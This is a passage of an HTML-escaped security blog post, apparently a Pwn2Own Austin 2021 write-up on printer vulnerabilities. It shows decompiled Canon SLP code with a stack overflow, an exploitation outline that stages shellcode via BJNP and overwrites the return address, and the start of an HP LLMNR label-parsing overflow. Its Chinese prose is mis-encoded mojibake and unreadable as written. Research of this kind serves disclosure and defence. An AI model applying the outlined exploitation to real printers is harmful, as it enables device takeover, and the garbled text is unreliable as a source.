      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;lt;=&amp;gt;~;*+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----------------------[3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos; &apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_35:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------------------[4] &lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_40:&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;next_one:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;debugprintff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3645&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Scope longer than buffer provided&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_48:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt; é‡å°æ˜¯æ²’æœ‰è·³è„«å­—å…ƒçš„è™•ç†ï¼Œæœƒåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[4]&lt;/code&gt; æª¢æŸ¥æ˜¯å¦æœ‰è¶…éæœ€å¤§é•·åº¦ï¼Œç„¶è€Œåœ¨æœ‰è·³è„«å­—å…ƒçš„è™•ç†ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; ï¼Œä¸¦æ²’æœ‰ä»»ä½•å°é•·åº¦çš„æª¢æŸ¥ï¼Œç›´æ¥å°‡è½‰æ›å¾Œçš„çµæœæ”¾åˆ° destination buffer ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt;ï¼Œä¸€æ—¦çµ¦å®šçš„å­—ä¸²å¤šæ•¸ç‚ºè·³è„«å­—å…ƒçš„æƒ…æ³ï¼Œå°±æœƒé€ æˆ stack overflowã€‚&lt;/p&gt;

&lt;p&gt;åœ¨æ‰¾åˆ°æ¼æ´ä¹‹å¾Œï¼Œç¬¬ä¸€ä»¶äº‹å°±æ˜¯å…ˆçœ‹çœ‹æœ¬èº«æœ‰ç”šéº¼ä¿è­·ï¼Œæ–¹ä¾¿å¾ŒçºŒçš„åˆ©ç”¨ã€‚ä½†åˆ†æäº†ä¸€ä¸‹ç™¼ç¾ï¼ŒCanon å°è¡¨æ©Ÿæœ¬èº«ä¸¦æ²’æœ‰ä»»ä½•è¨˜æ†¶é«”ç›¸é—œçš„ä¿è­·ã€‚&lt;/p&gt;

&lt;h4 id=&quot;protection&quot;&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;No Stack Guard&lt;/li&gt;
  &lt;li&gt;No DEP&lt;/li&gt;
  &lt;li&gt;No ASLR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ²’æœ‰ Stack Guardã€æ²’æœ‰ DEP ä¹Ÿæ²’æœ‰ ASLRï¼Œå¯ä»¥èªªæ˜¯ &lt;strong&gt;hacker friendly&lt;/strong&gt; ! å¦‚åŒå›åˆ° 90 å¹´ä»£ï¼Œä¸€å€‹ stack overflow å°±å¯ä»¥æ‰“å¤©ä¸‹ã€‚æ¥ä¸‹ä¾†å°±å¦‚åŒéå¾€çš„ Binary Exploitation åˆ©ç”¨æ‰‹æ³•ï¼Œæ‰¾å€‹åœ°æ–¹æ”¾ shellcode å†è¦†è“‹ return address è·³åˆ° shellcode å°±æœƒæœ‰ä»»æ„ç¨‹å¼ç¢¼åŸ·è¡Œäº†! æœ€çµ‚æˆ‘å€‘æ‰¾åˆ°äº† BJNP é€™å€‹æœå‹™ä¾†æ”¾æˆ‘å€‘çš„ shellcodeã€‚&lt;/p&gt;

&lt;h4 id=&quot;bjnp&quot;&gt;BJNP&lt;/h4&gt;
&lt;p&gt;BJNP æœ¬èº«ä¹Ÿæ˜¯å€‹æœå‹™ç™¼ç¾å”å®šï¼Œç”± Canon è‡ªå·±æ‰€è¨­è¨ˆï¼Œéå»ä¹Ÿæ›¾ç¶“æœ‰è¨±å¤šæ¼æ´ï¼Œ&lt;a href=&quot;https://www.synacktiv.com/publications/treasure-chest-party-quest-from-doom-to-exploit.html&quot;&gt;Synacktiv&lt;/a&gt; ä¹Ÿæ›¾ç¶“åˆ©ç”¨è©²å”å®šæ¼æ´ä¾†ç²å¾—å°è¡¨æ©Ÿæ§åˆ¶æ¬Šï¼Œé€™é‚Šä¸å¤šåšç´°ç¯€ä¸Šçš„ä»‹ç´¹ï¼Œæ›´å¤šç´°ç¯€å¯åƒè€ƒ&lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#bjnp&quot;&gt;é€™ç¯‡&lt;/a&gt;ï¼Œæˆ‘å€‘ä¹Ÿç”¨äº†é¡ä¼¼çš„æ‰‹æ³•ã€‚ BJNP æœ¬èº«æœƒå°‡å¯æ§çš„ session è³‡æ–™æ”¾åœ¨å·²çŸ¥çš„ global buffer ä¸­ï¼Œæˆ‘å€‘å¯ç”¨é€™å€‹åŠŸèƒ½ä¾†å°‡æˆ‘å€‘çš„ shellcode æ”¾åˆ°ä¸€å€‹å›ºå®šçš„ä½ç½®ä¸Šï¼ŒåŸºæœ¬ä¸Šä¹Ÿæ²’ç”šéº¼é™åˆ¶ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘é‡æ–°æ•´ç†ä¸€ä¸‹åˆ©ç”¨æ­¥é©Ÿ&lt;/p&gt;

&lt;h4 id=&quot;exploitation-step&quot;&gt;Exploitation Step&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;ä½¿ç”¨ BJNP å°‡æˆ‘å€‘çš„ shellcode æ”¾åˆ°å›ºå®šçš„å·²çŸ¥ä½ç½®ã€‚&lt;/li&gt;
  &lt;li&gt;è§¸ç™¼ SLP çš„ stack overflow ä¸¦è¦†è“‹ return address&lt;/li&gt;
  &lt;li&gt;è·³åˆ°æˆ‘å€‘çš„ shellcode ä¸ŠåŸ·è¡Œç¨‹å¼ç¢¼ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pwn2own-austin-2021-1&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;é€šå¸¸ Pwn2Own ä¸­æœƒéœ€è¦ä½ è­‰æ˜å·²æ‰“ä¸‹å°è¡¨æ©Ÿï¼Œé€™é‚Šå¯ä»¥è‡ªç”±é¸æ“‡å‘ˆç¾æ–¹å¼ï¼Œæˆ‘å€‘èµ·åˆæƒ³è¦çš„æ˜¯å¦‚åŒæˆ‘å€‘ exploit Lexmark å°è¡¨æ©Ÿä¸€æ¨£ï¼Œç›´æ¥å°‡ logo æ”¾åˆ°å°è¡¨æ©Ÿçš„ LCD è¢å¹•ä¸Šã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/16.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†åœ¨æ¯”è³½å‰ï¼Œæˆ‘å€‘èŠ±äº†å¾ˆå¤šæ™‚é–“åœ¨ç ”ç©¶è©²æ€éº¼æŠŠ logo å°åˆ°è¢å¹•ä¸Šï¼ŒèŠ±åœ¨é€™é‚Šæ™‚é–“å¯èƒ½æ¯”æ‰¾æ´è·Ÿå¯« exploit æ™‚é–“é‚„è¦é•·ï¼Œæœ€å¾Œä¹Ÿå› ç‚ºæ™‚é–“ä¸Šçš„å› ç´ ï¼Œæ¡å–äº†æ¯”è¼ƒä¿éšªçš„åšæ³•ï¼Œç›´æ¥æ”¹æ‰ &lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#service-mode&quot;&gt;Service Mode&lt;/a&gt; å­—ä¸²ï¼Œå†å°åˆ°è¢å¹•ä¸Šã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/17.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸éå¯¦éš›ä¸Šå°åœ–ç‰‡åˆ°è¢å¹•ä¸Šä¸¦ä¸é›£ï¼Œå…¶ä»–éšŠä¼æœ‰æ‰¾åˆ°&lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#displaying-an-image&quot;&gt;æ–¹æ³•&lt;/a&gt;ï¼Œæœ‰èˆˆè¶£çš„äººå¯ä»¥å˜—è©¦çœ‹çœ‹ã€‚&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/vQbQImZ3XRw?start=18400&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;debug&quot;&gt;Debug&lt;/h4&gt;
&lt;p&gt;çœ‹åˆ°é€™é‚Šå¯èƒ½æœƒæœ‰äººæƒ³å•é€™ç¨®ç’°å¢ƒå¦‚ä½• debugï¼Œå¯¦éš›ä¸Šä¾†èªªè¦ debug é€šå¸¸æœ‰å¹¾ç¨®æ–¹æ³•ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;æ¥ä¸Šç¡¬é«”ç²å¾— debug console å¾Œï¼Œç”¨è£¡é¢çš„åŠŸèƒ½ä¾† debug&lt;/li&gt;
  &lt;li&gt;ç”¨èˆŠçš„æ´ç²å¾—ç¨‹å¼ç¢¼åŸ·è¡Œå¾Œï¼Œè£ä¸Šå®¢è£½çš„ debugger&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä¸éæˆ‘å€‘ç•¶æ™‚å·²æ›´æ–°åˆ°æœ€æ–°ï¼Œè©²ç‰ˆæœ¬ä¸å­˜åœ¨èˆŠçš„æ¼æ´ï¼Œéœ€è¦é™ç‰ˆæœ¬å›å»ï¼Œè€Œæ‹†è§£ç¡¬é«”åŒæ¨£ä¹Ÿé ˆé¡å¤–çš„æ™‚é–“ï¼Œä½†ç•¶æ™‚æˆ‘å€‘å·²ç¶“æœ‰æ¼æ´äº†ï¼Œæ™‚é–“ä¸Šä¾†èªªä¸å¤ªåˆæˆæœ¬ã€‚æœ€å¾Œæˆ‘å€‘é‚„æ˜¯æ¡ç”¨æœ€å‚³çµ±çš„ sleep debug æ³•å» debugã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/18.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ ROP æˆ–åŸ·è¡Œ shellcode å¾Œï¼Œå°‡çµæœå°åˆ°ç¶²é æˆ–å…¶ä»–å¯è¦‹çš„åœ°æ–¹ï¼Œç„¶å¾Œå‘¼å« sleep å¾Œï¼Œå°±å¯å¾ç¶²é æˆ–å…¶ä»–è®€å‡ºçµæœï¼Œæœ€å¾Œå†é‡é–‹æ©Ÿï¼Œæ¥ä¸‹ä¾†å°±æ˜¯ä¸æ–·é‡è¤‡æ­¤æµç¨‹ã€‚ä¸éå¯¦éš›ä¸Šæ›´å¥½çš„åšæ³•é‚„æ˜¯æ¥ä¸Š debug console æœƒæ–¹ä¾¿ä¸€é»ã€‚&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹ä¾†è¬›è¬› HP å°è¡¨æ©Ÿ&lt;/p&gt;

&lt;h3 id=&quot;hp-1&quot;&gt;HP&lt;/h3&gt;

&lt;h4 id=&quot;link-local-multicast-name-resolution&quot;&gt;Link-Local Multicast Name Resolution&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution&quot;&gt;LLMNR&lt;/a&gt; æ˜¯èˆ‡ mDNS éå¸¸ç›¸ä¼¼çš„ä¸€å€‹å”å®šï¼Œæä¾›äº†å€ç¶²ä¸­çš„åŸŸåè§£æåŠŸèƒ½ï¼Œä½†æ¯” mDNS æ›´å–®ç´”ä¸€é»ï¼Œé€šå¸¸ä¹Ÿæœƒé…åˆä¸€äº›æœå‹™ç™¼ç¾å”å®šã€‚é€™é‚Šç°¡å–®ä»‹ç´¹æ­¤æ©Ÿåˆ¶ï¼š&lt;/p&gt;

&lt;p&gt;åœ¨å€ç¶²åŸŸåè§£ææ™‚ï¼ŒClient A æœƒå…ˆç”¨ multicast æ–¹å¼ï¼Œå°‹æ‰¾å€ç¶²ä¸­ Client C ä½ç½®
&lt;img src=&quot;/assets/img/blog/20231005/19.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ Client C æ¥æ”¶åˆ°ä¹‹å¾Œï¼Œå‰‡æœƒå›å‚³çµ¦ Client Aï¼Œç°¡å–®å¯¦ç¾äº†å€ç¶²åŸŸåçš„è§£æ
&lt;img src=&quot;/assets/img/blog/20231005/20.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€ŒåŸºæœ¬ä¸Š LLMNR å¤§å¤šå»ºç«‹åœ¨ &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc4795#section-2.1.1&quot;&gt;DNS å°åŒ…æ ¼å¼&lt;/a&gt; ä¸Šï¼Œæ ¼å¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/21.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸»è¦æœƒæ˜¯ header åŠ ä¸Š Queries é€™ç¨®æ ¼å¼ï¼ŒCount è¡¨ç¤ºä¸åŒå‹æ…‹çš„ query æ•¸ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/22.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œæ¯å€‹ DNS Query éƒ½æ˜¯ç”±è¨±å¤š label çµ„æˆï¼Œæ¯å€‹ label éƒ½æœƒåƒä¸Šåœ–ä¸­é€™æ¨£ï¼Œéƒ½æ˜¯é•·åº¦åŠ ä¸Šå­—ä¸²çš„çµ„åˆï¼Œä¹Ÿæœ‰ &lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc1035#section-4.1.4&quot;&gt;Message Compression&lt;/a&gt; æ©Ÿåˆ¶ï¼Œéå»åœ¨è™•ç†é€™äº›åœ°æ–¹æ™‚ï¼Œéå¸¸å®¹æ˜“å‡ºç¾å•é¡Œï¼Œåœ¨ BlackHat 2021 çš„ &lt;a href=&quot;https://i.blackhat.com/asia-21/Thursday-Handouts/as-21-dosSantos-The-Cost-of-Complexity-Different-Vulnerabilities-While-Implementing-the-Same-RFC.pdf&quot;&gt;THE COST OF COMPLEXITY:Different Vulnerabilities While Implementing the Same RFC&lt;/a&gt; ä¸­ï¼Œä¹Ÿæåˆ°äº†é¡ä¼¼çš„å•é¡Œã€‚&lt;/p&gt;

&lt;h4 id=&quot;vulnerability-1&quot;&gt;Vulnerability&lt;/h4&gt;

&lt;p&gt;æˆ‘å€‘å›é ­ä¾†çœ‹ä¸€ä¸‹ HP çš„å¯¦ä½œï¼š&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;llmnr_process_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...){&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;292&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;consume_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;llmnr_packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,...);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;é€™é‚Šå¯ä»¥çœ‹åˆ° HP åœ¨è™•ç† LLMNR å°åŒ…æ™‚ï¼Œæœƒå°‡ä¸€å€‹å›ºå®š buffer å‚³å…¥ï¼Œç”¨ä¾†æ”¾è™•ç†å¾Œçš„çµæœï¼Œè€Œ consume_lables å‰‡æ˜¯ä¸»è¦ç”¨ä¾†è™•ç† dns labelsã€‚&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;consume_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;llmnr_hdr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r12&lt;/span&gt;
